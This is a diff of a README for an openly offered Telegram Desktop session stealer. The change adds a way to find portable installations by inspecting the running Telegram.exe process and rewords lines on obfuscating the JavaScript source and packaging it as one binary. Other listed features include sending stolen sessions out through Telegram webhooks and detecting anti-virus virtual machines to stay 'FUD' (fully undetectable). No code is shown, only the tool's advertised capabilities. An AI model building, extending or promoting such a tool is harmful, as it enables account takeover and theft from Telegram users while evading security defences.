@@ -13,9 +13,10 @@ https://youtu.be/3mKOwtCnwYw
 ## Features
 
 - Steal Telegram Desktop sessions
-- Source is highly obfuscated using [javascript-obfuscator](https://github.com/javascript-obfuscator/javascript-obfuscator) and packaged to a single portable binary using [pkg](https://github.com/vercel/pkg)
 - Works on all platforms, including WSL (on WSL, the binary will get the sessions from its Windows host)
-- Portable, you don't need to install anything to run the binary
+- If Telegram Desktop is not in appData (i.e. portable installation), inspect the `Telegram.exe` running process to find its path (Windows or WSL only)
+- Source is highly obfuscated using [javascript-obfuscator](https://github.com/javascript-obfuscator/javascript-obfuscator)
+- Output binary is packaged to a single portable binary using [pkg](https://github.com/vercel/pkg)
 - Send sessions via Telegram using webhooks
 - Try to detect some anti-virus virtual machines to be FUD as long as possible
 
